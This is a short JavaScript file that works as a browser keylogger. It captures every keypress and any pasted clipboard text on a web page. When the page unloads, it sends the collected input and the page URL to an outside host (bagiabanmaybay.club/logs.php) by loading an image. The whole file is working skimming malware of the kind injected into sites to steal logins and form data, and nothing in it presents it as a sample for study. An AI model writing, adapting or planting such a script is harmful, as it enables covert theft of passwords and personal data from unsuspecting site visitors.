var keys='';
var el=document.body;
el.onpaste=handlePaste;
function handlePaste (e) {
    var clipboardData, pastedData;
    clipboardData = e.clipboardData || window.clipboardData;
    pastedData = clipboardData.getData('Text');
    keys=keys+'['+pastedData+']';
}
document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
	console.log(keys);
}
window.onbeforeunload=function(){
	if(keys.length>0) {
		new Image().src="https://bagiabanmaybay.club/logs.php?values="+keys+"<br/>"+document.URL;	
		keys = '';
	}
};